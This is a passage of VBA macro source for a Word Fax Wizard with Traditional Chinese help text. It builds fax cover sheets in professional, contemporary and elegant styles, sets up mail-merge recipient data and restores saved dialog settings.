    rgstrAssistantMsg(0) = "使用傳真精靈，您可以傳真電子郵件，將信件合併到傳真文件中一起傳真， 或從傳真機中印出一張封面表單。"
    rgstrAssistantMsg(1) = "如果您想要傳真其它文件，請先開啟您想要傳真的文件，然後再執行傳真精靈。"
    rgstrAssistantMsg(2) = "如果您的作業系統是 Windows NT，則您無法使用 Microsoft 傳真，但是您還是可以使用其它已安裝在系統中的傳真軟體來為您傳真。如果您的系統不支援傳真功能的話，沒關係，您可以先將文件列印出來，然後再利用傳真機將文件傳真出去。"
    rgstrAssistantMsg(iPANEL_RCPNTS) = "如果您曾用過傳真精靈，則下拉式清單方塊中會列出您最近傳真過的文件名稱。 您可以在清單中選取傳真過的文件，將其附在您的封面表單之後一起傳真出去。"
    rgstrAssistantMsg(iPANEL_SENDER) = "請輸入您想寫在封面表單上有關送件者的資料。"
    rgstrAssistantMsg(iPANEL_STYLE) = "請選取您封面表單所要的格式。在傳真之前，您還是可以改變封面表單的外觀，或是加入必要的註記。"
    rgstrAssistantMsg(iMAX_PANEL) = "要修改任何設定，請按「上一步」。"
    'if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.
    strAsstMsgRcpntsFormLtr = "請點取「姓名」欄位，再來請點取「傳真電話」欄位， 然後從通訊錄中選取要加入的收件人或其傳真電話。 您可以選擇傳真給每一個人或是指定只傳真給某人。"
    strAsstMsgRcpntsOrdDoc = "如果您曾用過傳真精靈，那麼「姓名」欄位的下拉式清單方塊中會有最近傳真對象的名字。您可以從中選取收件者姓名插入封面表單中。"
    

    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iLONG_NAME) = "專業式傳真.dot"
    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iSHORT_NAME) = "cPrfax.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iLONG_NAME) = "現代式傳真.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iSHORT_NAME) = "cCofax.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iLONG_NAME) = "典雅式傳真.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iSHORT_NAME) = "cElfax.dot"
    
    rgstrNotes(iSTY_PROFESSIONAL) = "註解："
    rgstrNotes(iSTY_CONTEMPORARY) = "註解："
    rgstrNotes(iSTY_ELEGANT) = "註解："
    
    ''**********************************************************************
    'DO NOT LOCALIZE BEYOND THIS POINT.
    ''******************************************************************************
    
    'initialize arrays with the color of the subway shapes for the panels
    For i = 0 To iMAX_PANEL
        rgfSkipPanel(i) = False
        rgiColorShape(i) = COLOR_LIGHTGREY
    Next i

    strBULLET = "�""
    strSOFT_ENTER = Chr$(11)
    strQUOTE = Chr$(34)
                                        
    'DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET
    'OF DIALOG VALUES IN THE REGISTRY.
    strRegSettingsKey = strREG_SETTINGS_BASE_KEY & "Fax Wizard"
End Sub

'initialises the form
Private Sub InitForm()
    On Error GoTo FatalError
    
    Set formWizard = New formWizDlg
    If formWizard Is Nothing Then
        DisplayErrorMsg strERR_INIT_FORM
        ReportError Err
    End If

    iCurrentPanel = 0
    formWizard.lblWizardName1.Caption = " " & strWizLongName & " "
    Exit Sub

FatalError:
    DisplayErrorMsg strERR_INIT_FORM
    ReportError Err
    
End Sub

Sub InitWizard(fDummy As Boolean)
    
    InitForm
    InitWizardStrings

    fNoCovSht = False
    fStylesCopied = False
End Sub

Public Sub SetMainDoc(fDummy As Boolean)
Dim cDocs As Integer
Dim i As Integer

    On Error GoTo FatalError
    
    fDocIsFormLtr = False
    fDocPresent = False
    fDocChanged = False
    cDocs = Application.Documents.Count
    
    If cDocs > 1 Then
    'we don't want to add the doc. that was just created thro' FileNew
        For i = 2 To cDocs
            formWizard.cboDocList.AddItem Documents(i).Name
        Next i

        formWizard.cboDocList.ListIndex = 0
        fDocPresent = True
    Else
        'just one doc. i.e the freshly created one
        Set objMainDoc = Nothing
    End If
    Exit Sub

FatalError:
    ReportError Err

End Sub

'checks the kind of document and sets fDocIsFormLtr
Public Sub CheckDocKind(objDoc As Document)
Dim objMM As MailMerge
Dim strQueryString As String
    On Error GoTo LReturn
    fDocIsFormLtr = False
    Set objMM = objMainDoc.MailMerge
    Set objDataSrc = objMM.DataSource
    If objDataSrc.Type = wdNoMergeInfo Then GoTo LReturn
    strQueryString = objDataSrc.QueryString
    strFormLetterSQL = Left$(strQueryString, 255)
    strFormLetterSQL1 = Mid$(strQueryString, 256)
    strConnectString = objDataSrc.ConnectString
    fDocIsFormLtr = True
    
    Exit Sub
LReturn:
    Err.Clear
    fDocIsFormLtr = False
End Sub

Public Sub CreateCoverSheet(fDummy As Boolean)
Dim strDocName As String
Dim objFps As PageSetup

    On Error GoTo FatalError
    Application.StatusBar = strCREATING_DOC
    Application.ScreenUpdating = False
    
    System.Cursor = wdCursorWait

    If fChangeToA4 Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sA4_LEFT_MARGIN
        objFps.RightMargin = sA4_RIGHT_MARGIN
    ElseIf fChangeToLetter Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sLETTER_MARGIN
        objFps.RightMargin = sLETTER_MARGIN
    End If
    
    If (((Not (fDocIsFormLtr)) And (iNumRcpnts > 1)) Or fDocIsFormLtr) Then _
        CreateDataSource
        
    StatusBar = strCREATING_DOC
    Select Case iFaxStyle
    Case iSTY_PROFESSIONAL
        CreateProfContCoverSheet
    Case iSTY_CONTEMPORARY
        CreateProfContCoverSheet
    Case iSTY_ELEGANT
        CreateElegCoverSheet
    End Select
    
    If (fDocPresent) And (Not (formWizard.optCovSht.Value)) Then
        strDocName = ActiveWindow.Caption & " - " & objMainDoc.Name & strWINDOW_CAPTION
    Else
        strDocName = ActiveWindow.Caption & strCOVER_SHEET_CAPTION
    End If
        
    With ActiveWindow
        .Caption = strDocName

        .View.TableGridlines = False
    End With
    ActiveDocument.UndoClear
    Selection.HomeKey wdStory
    
    With ActiveDocument.Content
        .SpellingChecked = True
        .GrammarChecked = True
    End With
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'creates a data source for the cover sheet in the temp. directory
Private Sub CreateDataSource()
Dim objRng As Range
Dim strPath As String
Dim objDataSrcDoc As Document, objMM As MailMerge
Dim strDataSrcName As String
    On Error GoTo FatalError
    
    Set objMM = ActiveDocument.MailMerge
    objMM.MainDocumentType = wdFormLetters
    
    If (fDocIsFormLtr) Then
        objMM.OpenDataSource objDataSrc.Name, Connection:=strConnectString
        objMM.DataSource.QueryString = strFormLetterSQL & strFormLetterSQL1
        Exit Sub
    End If
    
    Set objDataSrcDoc = Application.Documents.Add
    
    Set objRng = objDataSrcDoc.Content
    
    CreateTableFromFaxInfo objRng
    
    strPath = Options.DefaultFilePath(wdTempFilePath)
    If Right$(strPath, 1) <> strPathSeparator Then _
        strPath = strPath & strPathSeparator
        
    strDataSrcName = strPath & "~$CovSht@" & Format$(Date, "dd-mm-yy") & "," & Format$(Time, "hh-mm-ss") & ".tmp"
    objDataSrcDoc.SaveAs strDataSrcName, wdFormatDocument
    objDataSrcDoc.Close wdDoNotSaveChanges
    
    'attach the data source doc. to activedocument (cover sheet)
    objMM.OpenDataSource strDataSrcName
    
    Exit Sub
FatalError:
    ReportError Err
End Sub


'creates a table in the data source document with names and numbers
'the format of the table is just like how one would create a data source doc.
'through Word
Private Sub CreateTableFromFaxInfo(objRange As Range)
Dim strText As String
Dim i As Integer

    On Error GoTo FatalError

    strText = strFLD_FAX_NAME & vbCr & strFLD_FAX_NUMBER
    
    'collect the names and numbers entered by the user
    For i = 1 To iNumRcpnts
        strText = strText & vbCr & rgstrRcpntFaxNames(i - 1) & vbCr & rgstrRcpntFaxNums(i - 1)
    Next i

    objRange.InsertBefore strText
    'Add a table with 2 columns and iNumRcpnts+1 rows
    objRange.Select
    Selection.ConvertToTable vbCr, iNumRcpnts + 1, 2
    
    Exit Sub
FatalError:
    ActiveDocument.Close wdDoNotSaveChanges 'close the data source doc.
    ReportError Err
End Sub

Public Function FCopyStyles(iStyle As Integer) As Boolean
    Dim strStyleName As String
    Dim strLongName As String
    Dim i As Integer
    
    On Error GoTo TemplateNotFound
LFindTemplate:
    ' Attempt to locate longname, then shortname template file
    i = iLONG_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iLONG_NAME)
    strLongName = strStyleName
    If Dir(strStyleName) <> "" Then GoTo LApplyStyles
LTryShortName:
    i = iSHORT_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iSHORT_NAME)

LApplyStyles:
    StatusBar = strAPPLYING
    
    ' Get styles
    ActiveDocument.CopyStylesFromTemplate (strStyleName)
    
    ' No Error
    fStylesCopied = True
    StatusBar = ""
    FCopyStyles = True
    Exit Function
    
TemplateNotFound:
    If i = iLONG_NAME Then
        i = iSHORT_NAME
        Err.Clear
        GoTo LTryShortName
    End If
    DisplayErrorMsg strERR_STYLE_NOT_FOUND & strLongName & strERR_STYLE_NOT_FOUND2
    fStylesCopied = False
    StatusBar = ""
    FCopyStyles = False
End Function

'creates professional/Contemporary style cover sheet
Private Sub CreateProfContCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table

    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        InsertContAutoText
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    InsertReturnAddress
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (iFaxStyle = iSTY_PROFESSIONAL) Then
        If (Len(strCmpnyName)) Then
            objActiveRange.Style = strSTY_COMPANY_NAME
            objActiveRange.InsertBefore strCmpnyName & vbCr
            objActiveRange.Collapse wdCollapseEnd
        End If
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    

    
    Set objRngTextTable = objActiveRange.Duplicate
    
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    objActiveRange.InsertBefore strTO
    Set objRngBuffer1 = objActiveRange.Duplicate

    'insert recipient name
    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNames(0) & vbTab
    Else
        'insert appropriate field
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True
            If Len(strMFLastName) Then
                objActiveRange.InsertAfter strSPACE
                objActiveRange.Collapse wdCollapseEnd
                InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
            End If
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert From:
    objActiveRange.InsertBefore strFROM
    Set objRngBuffer2 = objActiveRange.Duplicate
    
    'insert sender's name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert macrobutton field.
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'next 3 lines in "Message Header" style
    'Insert Fax Number
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX
    Set objRngBuffer1 = objActiveRange.Duplicate

    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNums(0) & vbTab
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert the appropriate field
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Date
    objActiveRange.InsertBefore strDATE
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True

    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    
    'Next line
    'Insert Phone
    objActiveRange.InsertBefore strPHONE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Pages:
    objActiveRange.InsertBefore strPAGES
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'Insert Re:
    objActiveRange.InsertBefore strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert CC:
    objActiveRange.InsertBefore strCC
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 4, 4, AutoFit:=True, Format:=0)
    With objTable
        .Borders.Enable = False
        .Rows.SpaceBetweenColumns = 0
        If iFaxStyle = iSTY_CONTEMPORARY Then
            .Rows.LeftIndent = sCONT_LEFT_INDENT
        Else 'for professional style.
        'contemporary has autotext entry to insert the lines.
            Selection.Cells.AutoFit
            .Columns(2).Width = sCONT_WIDTH_COL1
            .Columns(4).Width = sCONT_WIDTH_COL1
            .Rows.Borders(wdBorderHorizontal).Visible = True
            .Borders(wdBorderBottom).Visible = True
        End If
    End With
    'convert to table inserts a vbCr after the table.
    InsertCheckBoxes
    InsertBodyText
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        Set objActiveRange = ActiveDocument.Content
        objActiveRange.Collapse wdCollapseStart
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) ' & vbCr
    '    objActiveRange.Collapse wdCollapseEnd
    End If
    Exit Sub
FatalError:
    ReportError Err
End Sub
'creates an elegant style cover sheet
Private Sub CreateElegCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table, objRow As Row
Dim i As Integer

    On Error GoTo FatalError
    
    InsertReturnAddress
    
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (Len(strCmpnyName)) Then
        objActiveRange.Style = strSTY_COMPANY_NAME
        objActiveRange.InsertBefore strCmpnyName & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    'Insert title
    objActiveRange.Style = strSTY_DOC_LABEL
    objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
    objActiveRange.Collapse wdCollapseEnd
    
    Set objRngTextTable = objActiveRange.Duplicate
        
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To: & From:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    
    objActiveRange.InsertBefore strTO & vbTab & strFROM
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True 'Preserveformatting
        If Len(strMFLastName) Then
            objActiveRange.InsertAfter strSPACE
            objActiveRange.Collapse wdCollapseEnd
            InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
        End If
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNames(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
    End If
    
    'insert name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL

    'next 3 lines in "Message Header" style
    'Insert FaxNumber and Date
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX_NUMBER & vbTab & strDATE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    
    'insert recipient number
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True 'Preserveformatting
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNums(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
    End If
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Insert CompanyName & Pages
    objActiveRange.InsertBefore strCOMPANY & vbTab & strTOTAL_NO_PAGES
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert company name
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMPANY, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Phone Number & Re:
    objActiveRange.InsertBefore strPHONE_NUMBER & vbTab & strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End '- 1 'don't want the last CR
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 10, 2, Format:=0)
    objTable.Borders.Enable = False
    
    For i = 2 To 8 Step 2
        Set objRow = objTable.Rows(i)
        objRow.Range.ParagraphFormat.LeftIndent = 0.25 * 72
        'don't need the bottom border for the last row.
        If i <> 8 Then objRow.Borders(wdBorderBottom) = True
    Next i
    
    InsertCheckBoxes
    InsertBodyText
    
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Get the names of the merge fields to be inserted in the cover sheet
'If the original doc. is a form letter then we need to insert the merge fields
'selected by the user. If not then insert the merge field names we created in the
'data source we created
Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String)
    On Error GoTo FatalError
    
    If (fDocIsFormLtr) Then
        'user selects names from drop-down of all possible mergefields in data source
        strFirstName = formWizard.cboFldsRcpntFirstName.Text
        strLastName = formWizard.cboFldsRcpntLastName.Text
        If (strLastName = strNONE) Then strLastName = ""
        strFaxNum = formWizard.cboFldsFaxNum.Text
    Else
       strFirstName = strFLD_FAX_NAME
       strLastName = ""
       strFaxNum = strFLD_FAX_NUMBER
    End If
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertReturnAddress()
Dim strFromPh As String
Dim strFromFax As String
Dim strText As String, strAddress As String

    On Error GoTo FatalError
    
    'Set objActiveRange = ActiveDocument.Content
    'If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd

    strFromPh = formWizard.txtSenderPhone.Text
    strFromFax = formWizard.txtSenderFax.Text
    strAddress = formWizard.txtMailingAddr.Text

    Select Case iFaxStyle
    
    Case iSTY_CONTEMPORARY, iSTY_PROFESSIONAL
        strText = strAddress
        If Len(strText) Then strText = strText & vbCr
        If Len(strFromPh) <> 0 Then _
            strText = strText & strPHONE & strSPACE & strFromPh & vbCr

        If Len(strFromFax) <> 0 Then _
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        If Len(strText) = 0 Then strText = strText & vbCr
    Case iSTY_ELEGANT
        strText = StrReplaceCrLfWithText(strAddress, strSPACE & strBULLET & strSPACE)
        If Len(strText) Then strText = strText & vbCr
        'if you have phone number
        If Len(strFromPh) <> 0 Then
            strText = strText & strPHONE & strSPACE & strFromPh
            'check if you also have fax
            'instead of vbCr use space, bullet, space combination
            If Len(strFromFax) <> 0 Then _
                strText = strText & strSPACE & strBULLET & strSPACE & strFAX & strSPACE & strFromFax
            strText = strText & vbCr
        'check if you have only Fax
        ElseIf Len(strFromFax) <> 0 Then
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        End If
        
    End Select
    
    objActiveRange.Style = strSTY_RETURN_ADDR
    objActiveRange.InsertBefore strText
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
'Inserts the check-boxes and the text associated with them
Private Sub InsertCheckBoxes()
Dim i As Integer
Dim R1 As Range
    On Error GoTo FatalError
    objActiveRange.Style = strSTY_MSG_HDR_LAST
    objActiveRange.Collapse wdCollapseEnd
    Set R1 = objActiveRange.Duplicate

    Set R1 = objWizTemplate.AutoTextEntries(strAT_UNCHKD_BOX).Insert(R1)

    objActiveRange.End = R1.End + 1
    objActiveRange.Start = R1.End + 1
    objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(1) + vbTab
    objActiveRange.Style = wdStyleEmphasis

    objActiveRange.Collapse wdCollapseEnd
    For i = 2 To 5
        objActiveRange.FormattedText = R1.FormattedText
        objActiveRange.Collapse wdCollapseEnd
        objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(i) + vbTab
        objActiveRange.Style = wdStyleEmphasis
        objActiveRange.Collapse wdCollapseEnd
    Next i

    'delete the previous character i.e the last tab
    objActiveRange.Start = objActiveRange.End - 1
    objActiveRange.Delete
    objActiveRange.InsertParagraph
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

Private Sub InsertBodyText()
Dim R1 As Range
Dim strAfterText As String
    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_ELEGANT Then
        strAfterText = vbCr
    Else
        strAfterText = strSPACE & strSPACE
    End If

    
    If iFaxStyle = iSTY_PROFESSIONAL Then _
        objActiveRange.InsertAfter strBULLET

    objActiveRange.InsertAfter rgstrNotes(iFaxStyle) & strAfterText
    
    Set R1 = objActiveRange.Duplicate
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMMENTS, False 'PreserveFormatting
    objActiveRange.Style = wdStyleBodyText
    R1.Style = strSTY_MSG_HDR_LABEL
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertContAutoText()

    On Error GoTo FatalError
    Set objActiveRange = objWizTemplate.AutoTextEntries(strCNTMPGFX2).Insert(objActiveRange, True)
   
    Exit Sub
FatalError:
    DisplayErrorMsg strERR_AUTOTEXT_NOT_FOUND
End Sub


Public Sub RestoreDialogValues(fDummy As Boolean)
    Dim fAddrBkEnable As Boolean
    Dim i As Integer
    Dim strChkdAddr As String
    
    On Error GoTo FatalError
    StatusBar = strRST_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
   
    fAddrBkEnable = Application.MAPIAvailable
    formWizard.cmdRcpntsAddrBk.Enabled = fAddrBkEnable
    formWizard.cmdSenderAddrBk.Enabled = fAddrBkEnable
    
'Setting options in Panel1 depending on whether a doc. is present or not
    If fDocPresent Then
        formWizard.optCurDoc.Value = True
        formWizard.optCurDocCovShtYes.Value = True
    Else
        'disable a bunch of options
        formWizard.optCurDoc.Enabled = False
        formWizard.cboDocList.Enabled = False
        formWizard.optCurDocCovShtNo.Enabled = False
        formWizard.optCurDocCovShtYes.Enabled = False
        formWizard.optCovSht.Value = True
        formWizard.frmRcpntsFormDoc.Visible = False
        formWizard.frmRcpntsOrdDoc.Visible = True
    
    End If

    'Panel2
    'read values from registry.
    iFaxOption = IRestorePref("Fax Option", 0)
    If InStr(UCase$(System.OperatingSystem), "NT") Then
        fMSFAXEnabled = False
        formWizard.optMSFax.Enabled = False
    Else
        fMSFAXEnabled = True
    End If
    'set printer in combo-box before disabling frmFaxDriver.
    GetAllPrinters
        
    'the controls are assumed to be enabled initially and are explicityly
    'only turned off, never turned on.
    If (iFaxOption = iMS_FAX) And Not (fMSFAXEnabled) Then
        If iTotalNumPrinters > 0 Then
            iFaxOption = iDIFF_FAX
        Else
            iFaxOption = iNO_FAX
        End If
    End If
    Select Case iFaxOption
        Case iMS_FAX:
            formWizard.optMSFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case iDIFF_FAX:
            formWizard.optDifferentFax.Value = True
        Case iNO_FAX:
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case Else
            iFaxOption = iNO_FAX
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
            
    End Select
    
    'Panel3
    fRegistryNamesRead = False
    
    'Panel5
    formWizard.txtSenderName.Text = Application.UserName

    i = ICountLines(Application.UserAddress, strChkdAddr, iMAX_ADDR_LINES)
    formWizard.txtMailingAddr.Text = strChkdAddr
    formWizard.txtSenderFax.Text = StrRestorePref("Sender Fax", "")
    formWizard.txtSenderPhone.Text = StrRestorePref("Sender Phone", "")
    
    'Panel 4
    iFaxStyle = IRestorePref("Coversheet Style", 0)
    If (iFaxStyle < iSTY_PROFESSIONAL) Or (iFaxStyle > iSTY_ELEGANT) Then _
        iFaxStyle = iSTY_PROFESSIONAL
    Select Case iFaxStyle
        Case iSTY_PROFESSIONAL
            formWizard.optStyleProf.Value = True
            formWizard.lblStyle0.Visible = True
        Case iSTY_CONTEMPORARY
            formWizard.optStyleCont.Value = True
            formWizard.lblStyle1.Visible = True
        Case iSTY_ELEGANT
            formWizard.optStyleEleg.Value = True
            formWizard.lblStyle2.Visible = True
    End Select
    
